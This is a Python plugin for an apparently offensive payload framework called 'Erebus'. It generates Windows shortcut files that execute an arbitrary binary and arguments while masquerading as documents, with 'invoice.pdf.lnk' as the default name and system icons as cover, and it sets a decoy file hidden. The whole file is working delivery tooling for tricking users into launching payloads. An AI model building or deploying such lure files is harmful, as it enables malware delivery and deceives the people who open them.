"""
Erebus Plugin - LNK Trigger
Author: Whispergate
Description: Creates Windows shortcut (.lnk) triggers for payload execution

This plugin creates LNK files that can execute payloads while displaying decoy documents.
It supports custom icons, file hiding, and cross-platform functionality.
"""

import pathlib
import os
import sys
import stat
from typing import Dict, Callable, Optional

try:
    from .plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class LnkTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating Windows LNK (shortcut) triggers.
    
    LNK files can execute commands while appearing as document files to users.
    This plugin provides functionality to create LNK triggers with custom icons,
    decoy file support, and file hiding capabilities.
    """
    
    def __init__(self):
        """Initialize the LNK trigger plugin"""
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"
        self.DECOY_FILE = self.AGENT_CODE / "decoys" / "decoy.pdf"
    
    def get_metadata(self) -> PluginMetadata:
        """Return plugin metadata"""
        return PluginMetadata(
            name="lnk_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates Windows shortcut (.lnk) triggers for payload execution",
            category=PluginCategory.TRIGGER,
            enabled=True
        )
    
    def register(self) -> Dict[str, Callable]:
        """Register the functions this plugin provides"""
        return {
            "create_payload_trigger": self.create_payload_trigger,
            "create_lnk_trigger": self.create_lnk_trigger,
            "set_file_hidden": self.set_file_hidden,
        }
    
    def validate(self) -> tuple[bool, Optional[str]]:
        """Validate that required dependencies are available"""
        try:
            import pylnk3
            return (True, None)
        except ImportError as e:
            return (False, f"Missing required dependency: {e}")
    
    def on_load(self):
        """Called when plugin is loaded"""
        print(f"[Plugin] LNK Trigger plugin loaded - Supporting Windows shortcut creation")
    
    # ==================== Plugin Functions ====================
    
    def set_file_hidden(self, file_path: str):
        """
        Set a file as hidden (Windows) or with restricted permissions (Linux/Unix).
        
        Args:
            file_path: Path to the file to hide
        """
        try:
            file_path_obj = pathlib.Path(file_path)
            if not file_path_obj.exists():
                print(f"Warning: File does not exist: {file_path}")
                return

            if sys.platform == "win32":
                try:
                    import ctypes
                    FILE_ATTRIBUTE_HIDDEN = 0x02
                    ctypes.windll.kernel32.SetFileAttributesW(str(file_path), FILE_ATTRIBUTE_HIDDEN)
                except Exception as e:
                    print(f"Error setting file as hidden on Windows: {e}")
            else:
                os.chmod(file_path, stat.S_IRUSR | stat.S_IWUSR)
                print(f"File permissions restricted: {file_path}")
        except Exception as e:
            print(f"Error setting file attributes: {e}")
    
    def create_lnk_trigger(
        self,
        target_bin: str,
        args: str,
        icon_src: str,
        icon_index: int,
        description: str,
        payload_dir: Optional[pathlib.Path] = None,
        output_filename: str = "invoice.pdf.lnk"
    ) -> pathlib.Path:
        """
        Create an LNK trigger file in the payloads directory.
        
        Args:
            target_bin: Binary to execute (e.g., "cmd.exe")
            args: Binary arguments
            icon_src: DLL source for Windows Icons (e.g., "C:\\Windows\\System32\\imageres.dll")
            icon_index: Index number of icon
            description: LNK description
            payload_dir: Directory where payload files are stored (uses default if None)
            output_filename: Output LNK filename (default: "invoice.pdf.lnk")
        
        Returns:
            pathlib.Path: Path to the created LNK file
            
        Raises:
            RuntimeError: If LNK creation fails
        """
        try:
            import pylnk3
            if payload_dir is None:
                payload_dir = self.PAYLOAD_DIR
            
            lnk_output_path = payload_dir / output_filename

            # Create LNK file with proper properties
            lnk = pylnk3.Lnk()
            lnk = pylnk3.for_file(target_bin, str(lnk_output_path), args, description, icon_src, icon_index)
            lnk.save(str(lnk_output_path))

            return lnk_output_path
            
        except Exception as e:
            raise RuntimeError(f"LNK trigger creation failed: {e}")
    
    def create_payload_trigger(
        self,
        target_bin: str,
        args: str,
        icon_src: str,
        icon_index: int,
        description: str,
        payload_dir: Optional[pathlib.Path] = None,
        decoy_file: Optional[pathlib.Path] = None
    ) -> pathlib.Path:
        """
        Create LNK trigger with decoy file support.
        
        Creates an LNK shortcut that executes the payload and optionally
        hides an associated decoy file.
        
        Args:
            target_bin: Binary to execute
            args: Binary arguments
            icon_src: DLL source for Windows icons
            icon_index: Index number of icon
            description: LNK description
            payload_dir: Directory where payload files are stored (uses default if None)
            decoy_file: Path to decoy file that will be hidden (uses default if None)
        
        Returns:
            pathlib.Path: Path to the created LNK file
            
        Raises:
            RuntimeError: If trigger creation fails
        """
        try:
            if decoy_file is None:
                decoy_file = self.DECOY_FILE

            lnk_file = self.create_lnk_trigger(
                target_bin=target_bin,
                args=args,
                icon_src=icon_src,
                icon_index=icon_index,
                description=description,
                payload_dir=payload_dir
            )

            # Set decoy file as hidden
            if decoy_file.exists():
                self.set_file_hidden(str(decoy_file))

            return lnk_file
            
        except Exception as e:
            raise RuntimeError(f"Payload trigger creation failed: {e}")


# Testing code
if __name__ == "__main__":
    print("Testing LNK Trigger Plugin...")
    
    plugin = LnkTriggerPlugin()
    
    metadata = plugin.get_metadata()
    print(f"Plugin: {metadata.name} v{metadata.version}")
    
    is_valid, error = plugin.validate()
    if is_valid:
        print("✓ Plugin validation passed")
    else:
        print(f"✗ Plugin validation failed: {error}")
    
    print("Testing complete!")
